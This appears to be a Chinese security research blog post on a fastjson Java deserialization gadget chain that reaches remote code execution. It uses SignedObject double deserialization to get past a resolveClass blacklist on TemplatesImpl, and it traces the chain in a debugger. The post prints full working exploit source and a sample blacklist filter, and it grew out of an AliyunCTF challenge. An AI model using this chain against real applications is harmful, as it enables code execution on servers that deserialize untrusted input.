@@ -1,0 +1,195 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h4 data-content="1" id="647512d1d10b23452b7103afec172484">省流</h4>
+<p>该利用链可以在<code>fastjson</code>多个版本实现<code>RCE</code>，并且借助<code>SignedObject</code>绕过第一层安全的<code>resolveClass</code>对于<code>TemplatesImpl</code>类的检查。</p>
+<p>条件如下：</p>
+<ol>
+<li>
+<code>ObjectInputStream</code>（反序列化）输入数据可控</li>
+<li>引入<code>Fastjson</code>依赖</li>
+</ol>
+<h4 data-content="1" id="a70993e5a33115c5fb2aaeae618f19ac">FastJson之不安全的反序列化利用</h4>
+<p>说起来还是<code>AliyunCTF</code>那道<code>ezbean</code>的非预期，很多师傅使用<code>FastJson#toString</code>方法触发<code>TemplatesImpl#getOutputProperties</code>实现<code>RCE</code>。</p>
+<p><strong>gadget</strong></p>
+<pre><code>BadAttributeValueExpException#readObject
+JSONArray#toString
+TemplatesImpl#getOutputProperties</code></pre>
+<p><code>FastJson</code>反序列化并不是通过<code>ObjectInputStream.readObject()</code>还原对象，而是在反序列化的过程中自动调用类属性的<code>setter/getter</code>方法，将<code>JSON</code>字符串还原成对象。</p>
+<p>因此从<code>FJ 1.2.49</code>开始，<code>JSONArray</code>和<code>JSONObject</code>开始重写了<code>resolveClass</code>，过滤了诸如<code>TemplatesImpl</code>的危险类。而<code>ezbean</code>那道题使用了一个不安全的<code>ObjectInputStream</code>进行反序列化。</p>
+<p>这也就导致了选手通过引用的数据类型从而不执行<code>resolveClass</code>以绕过其对危险类的检查，导致了非预期。</p>
+<p><strong>exp</strong></p>
+<div class="highlight"><pre><span></span><span class="n">List</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">list</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;&gt;();</span>
+
+        <span class="n">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="n">GadgetUtils</span><span class="o">.</span><span class="na">createTemplatesImpl</span><span class="o">(</span><span class="s">"calc"</span><span class="o">);</span>
+
+        <span class="n">list</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">templates</span><span class="o">);</span>          <span class="c1">//第一次添加为了使得templates变成引用类型从而绕过JsonArray的resolveClass黑名单检测</span>
+
+        <span class="n">JSONArray</span> <span class="n">jsonArray</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JSONArray</span><span class="o">();</span>
+        <span class="n">jsonArray</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">templates</span><span class="o">);</span>           <span class="c1">//此时在hash表中查到了映射，因此接下来以引用形式输出</span>
+
+        <span class="n">BadAttributeValueExpException</span> <span class="n">bd</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BadAttributeValueExpException</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
+        <span class="n">ReflectionUtils</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">bd</span><span class="o">,</span><span class="s">"val"</span><span class="o">,</span><span class="n">jsonArray</span><span class="o">);</span>
+        <span class="n">list</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">bd</span><span class="o">);</span>
+        <span class="c1">//字节</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">payload</span> <span class="o">=</span> <span class="n">SerializerUtils</span><span class="o">.</span><span class="na">serialize</span><span class="o">(</span><span class="n">list</span><span class="o">);</span>
+
+        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MyInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">payload</span><span class="o">));</span>
+        <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+</pre></div>
+<h4 data-content="1" id="c1d1392700601d71477f1c1824a602b9">问题</h4>
+<p>似乎这样的方式只能在目标环境使用了一个不安全的<code>ObjectInputStream</code>的场景下应用。</p>
+<p>因为<code>templates</code>是以引用的形式来绕过<code>FJ</code>的<code>resolveClass</code>方法的黑名单检查，因此在（见<code>exp</code>第三行）必须把<code>templates</code>添加到<code>list</code>中，所以如果重写了<code>ObjectInputStream</code>过滤<code>templates</code>，这样的方法就失效了。</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">MyInputStream</span> <span class="kd">extends</span> <span class="n">ObjectInputStream</span> <span class="o">{</span>
+    <span class="kd">private</span> <span class="kd">final</span> <span class="n">List</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">BLACKLIST</span> <span class="o">=</span> <span class="n">Arrays</span><span class="o">.</span><span class="na">asList</span><span class="o">(</span><span class="s">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="o">,</span> <span class="s">"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter"</span><span class="o">,</span> <span class="s">"com.sun.syndication.feed.impl.ObjectBean"</span><span class="o">,</span> <span class="s">"import com.sun.syndication.feed.impl.ToStringBean"</span><span class="o">);</span>
+
+    <span class="kd">public</span> <span class="nf">MyInputStream</span><span class="o">(</span><span class="n">InputStream</span> <span class="n">inputStream</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">(</span><span class="n">inputStream</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">protected</span> <span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">resolveClass</span><span class="o">(</span><span class="n">ObjectStreamClass</span> <span class="n">cls</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ClassNotFoundException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
+        <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">BLACKLIST</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">cls</span><span class="o">.</span><span class="na">getName</span><span class="o">()))</span> <span class="o">{</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="n">InvalidClassException</span><span class="o">(</span><span class="s">"The class "</span> <span class="o">+</span> <span class="n">cls</span><span class="o">.</span><span class="na">getName</span><span class="o">()</span> <span class="o">+</span> <span class="s">" is on the blacklist"</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="kd">super</span><span class="o">.</span><span class="na">resolveClass</span><span class="o">(</span><span class="n">cls</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p>解决方案也很简单，就是通过二次反序列化绕过。</p>
+<h4 data-content="1" id="4488f362e2220c2fd28298c5e3ce659c">SignedObject</h4>
+<p>简单介绍下<code>SignedObject</code>，摘录自<a href="https://tttang.com/archive/1701/#toc_equalsbean" target="_blank">Poria师傅博客</a></p>
+<p>当防御者重写了<code>ObjectInputStream</code>类，并且再<code>resolveClass</code>方法定义了反序列化黑名单类时，此时就需要通过二次反序列化绕过。</p>
+<p>顾名思义，<strong>二次反序列化攻击就是在受害服务器进行第一次反序列化的过程中借助某些类的方法进行第二次反序列化。</strong>而第二次反序列化是没有<code>ban</code>恶意类的，通过这种方法间接的实现<code>bypass</code>黑名单。</p>
+<p>阅读该类注释可知这个类可以存放一个序列化数据并且有一个属于该数据的签名。</p>
+<pre><code>More specifically, a SignedObject contains another Serializable object, the (to-be-)signed object and its signature.</code></pre>
+<p>再观察<code>getObject</code>方法，可以看到其中进行了一次反序列化，这完美符合了我们的要求，并且该类是<code>jdk</code>内置类。</p>
+<p>事实上，该类主要用于加密反序列化数据，防止攻击者截获数据包从而解析序列化数据（竟然有些讽刺）。</p>
+<div class="highlight"><pre><span></span><span class="cm">/**</span>
+<span class="cm">     * Retrieves the encapsulated object.</span>
+<span class="cm">     * The encapsulated object is de-serialized before it is returned.</span>
+<span class="cm">     *</span>
+<span class="cm">     * @return the encapsulated object.</span>
+<span class="cm">     *</span>
+<span class="cm">     * @exception IOException if an error occurs during de-serialization</span>
+<span class="cm">     * @exception ClassNotFoundException if an error occurs during</span>
+<span class="cm">     * de-serialization</span>
+<span class="cm">     */</span>
+    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">getObject</span><span class="o">()</span>
+        <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span>
+    <span class="o">{</span>
+        <span class="c1">// creating a stream pipe-line, from b to a</span>
+        <span class="n">ByteArrayInputStream</span> <span class="n">b</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">content</span><span class="o">);</span>
+        <span class="n">ObjectInput</span> <span class="n">a</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="n">b</span><span class="o">);</span>
+        <span class="n">Object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">a</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+        <span class="n">b</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+        <span class="n">a</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+        <span class="k">return</span> <span class="n">obj</span><span class="o">;</span>
+    <span class="o">}</span>
+</pre></div>
+<p>而要反序列化的<code>this.content</code>可以通过构造方法赋值，并且该方法是一个相对容易触发的<code>getter</code>方法，所以<strong>问题转化为了如何触发SignedObject#getObject。</strong></p>
+<h4 data-content="1" id="334bc92862d7cc459a91353ca7e04276">解决方案</h4>
+<p>最好找只依赖于<code>FastJson</code>的包的<code>gadget</code>，使得攻击面最大。</p>
+<p>而正好<code>JsonObject#toString</code>可以触发任意<code>getter</code>方法，而<code>toString</code>又可以通过<code>BadAttributeValueExpException#readObject</code>调用，因此整条链子就通了。</p>
+<p><strong>gadget</strong></p>
+<pre><code>* 绕过第一次的TemplatesImpl黑名单检查
+    BadAttributeValueExpException#readObject
+    JSONOBJECT#toString
+    SignedObject#getObject
+* 二次反序列化
+    * 引用绕过JSON自带resolveClass的黑名单检查
+        BadAttributeValueExpException#readObject
+        JSONArray#toString
+        TemplatesImpl#getOutputProperties
+            TemplatesImpl#newTransformer
+            TemplatesImpl#getTransletInstance
+            TemplatesImpl#defineTransletClasses
+            TemplatesImpl#defineClass</code></pre>
+<p><strong>exp</strong></p>
+<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">gadget.fastjson</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSONArray</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">gadget.doubleunser.MyInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">util.GadgetUtils</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">util.ReflectionUtils</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">util.SerializerUtils</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.management.BadAttributeValueExpException</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.Serializable</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.security.KeyPair</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.security.KeyPairGenerator</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.security.Signature</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.security.SignedObject</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.ArrayList</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.List</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">FJ2</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+
+        <span class="n">List</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">list</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;&gt;();</span>
+
+        <span class="n">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="n">GadgetUtils</span><span class="o">.</span><span class="na">createTemplatesImpl</span><span class="o">(</span><span class="s">"calc"</span><span class="o">);</span>
+
+        <span class="n">list</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">templates</span><span class="o">);</span>          <span class="c1">//第一次添加为了使得templates变成引用类型从而绕过JsonArray的resolveClass黑名单检测</span>
+
+        <span class="n">JSONArray</span> <span class="n">jsonArray2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JSONArray</span><span class="o">();</span>
+        <span class="n">jsonArray2</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">templates</span><span class="o">);</span>           <span class="c1">//此时在handles这个hash表中查到了映射，后续则会以引用形式输出</span>
+
+        <span class="n">BadAttributeValueExpException</span> <span class="n">bd2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BadAttributeValueExpException</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
+        <span class="n">ReflectionUtils</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">bd2</span><span class="o">,</span><span class="s">"val"</span><span class="o">,</span><span class="n">jsonArray2</span><span class="o">);</span>
+
+        <span class="n">list</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">bd2</span><span class="o">);</span>
+
+        <span class="c1">//二次反序列化</span>
+        <span class="n">KeyPairGenerator</span> <span class="n">kpg</span> <span class="o">=</span> <span class="n">KeyPairGenerator</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"DSA"</span><span class="o">);</span>
+        <span class="n">kpg</span><span class="o">.</span><span class="na">initialize</span><span class="o">(</span><span class="mi">1024</span><span class="o">);</span>
+        <span class="n">KeyPair</span> <span class="n">kp</span> <span class="o">=</span> <span class="n">kpg</span><span class="o">.</span><span class="na">generateKeyPair</span><span class="o">();</span>
+        <span class="n">SignedObject</span> <span class="n">signedObject</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SignedObject</span><span class="o">((</span><span class="n">Serializable</span><span class="o">)</span> <span class="n">list</span><span class="o">,</span> <span class="n">kp</span><span class="o">.</span><span class="na">getPrivate</span><span class="o">(),</span> <span class="n">Signature</span><span class="o">.</span><span class="na">getInstance</span><span class="o">(</span><span class="s">"DSA"</span><span class="o">));</span>
+
+        <span class="c1">//触发SignedObject#getObject</span>
+        <span class="n">JSONArray</span> <span class="n">jsonArray1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">JSONArray</span><span class="o">();</span>
+        <span class="n">jsonArray1</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">signedObject</span><span class="o">);</span>
+
+        <span class="n">BadAttributeValueExpException</span> <span class="n">bd1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BadAttributeValueExpException</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
+        <span class="n">ReflectionUtils</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">bd1</span><span class="o">,</span><span class="s">"val"</span><span class="o">,</span><span class="n">jsonArray1</span><span class="o">);</span>
+
+        <span class="c1">//验证</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">payload</span> <span class="o">=</span> <span class="n">SerializerUtils</span><span class="o">.</span><span class="na">serialize</span><span class="o">(</span><span class="n">bd1</span><span class="o">);</span>
+
+        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">MyInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="o">(</span><span class="n">payload</span><span class="o">));</span>  <span class="c1">//再套一层inputstream检查TemplatesImpl，不可用</span>
+        <span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<h4 data-content="1" id="499e1c552d5e880b3ac50f8def61dec0">调试</h4>
+<p>通过<code>SingedObject</code>绕过了黑名单对于<code>Templates</code>的校验。触发<code>BadAttributeValueExpException#readObject</code>，通过<code>gf.get</code>获取<code>JsonArray</code>。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230613164356-6eeb4668-09c6-1.png"/></p>
+<p>从<code>JSON#toString</code>触发<code>JSON#toJSONString</code>，并在下图断点处<code>getter</code>方法。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230613164513-9d131a16-09c6-1.png"/></p>
+<p>进入到<code>JSONSerializer#write</code>方法，首先获取<code>object</code>的类名，随后，将触发<code>ListSerializer</code>。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230613164537-aae3b100-09c6-1.png"/></p>
+<p>接下来触发<code>ListSerializer#write</code>一段很长的方法，主要就是进入到<code>for</code>循环把<code>list</code>的东西取出来进行后续操作。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230613164645-d3a0017a-09c6-1.png"/></p>
+<p>后面比较复杂，总之就是通过<code>createJavaBeanSerializer</code>创建<code>ObjectSerializer</code>对象。通过<code>ASM</code>技术创建目标类（在这里是<code>SignedObject</code>）进行后续的处理。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230613164912-2b39d26c-09c7-1.png"/></p>
+<p>进入到了<code>ASMSerializerFactory#generaterWriteMethod</code>，可以看到他就是把<code>SignedObject</code>重构出来了。获取到该类的三个字段并一个一个触发对应的<code>getter</code>方法。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230613165058-6a83a254-09c7-1.png"/></p>
+<p>最终触发了<code>SignedObject#getObject</code>进行了二次反序列化。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230613165133-7f7429b8-09c7-1.png"/></p>
+<p>同样的，通过了<code>JSONArray#toString</code>最终通过<code>ASMSerializerFactory#_get</code>触发<code>TemplatesImpl#getOutputProperties</code>方法实现<code>RCE</code>。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230613165202-907145ca-09c7-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230613165244-a9af4e74-09c7-1.png"/></p>
+<h4 data-content="1" id="420c773576af6a490fc538729a1b3dc4">结语</h4>
+<p><code>fastjson</code>的利用往往通过<code>parseObject</code>触发反序列化，此次探索是在<code>readObject</code>反序列化场景下进行。真实场景下不太了解，emm可能在<code>ctf</code>中可以通过这条链子打个非预期吧。</p>
+<p>由于笔者水平不高，希望师傅们多多指正。</p>
+<h4 data-content="1" id="0ef1c498e5a0854099cf930d874aca45">参考文献</h4>
+<ol>
+<li><a href="https://tttang.com/archive/1701/#toc_equalsbean" target="_blank">二次反序列化 看我一命通关-Ploria</a></li>
+<li><a href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/" target="_blank">FastJson与原生反序列化(二)-Y4tacker</a></li>
+<li><a href="https://xz.aliyun.com/t/12485" target="_blank">AliyunCTF官方writeup-f1yyy</a></li>
+</ol>
+</div>
+</div>
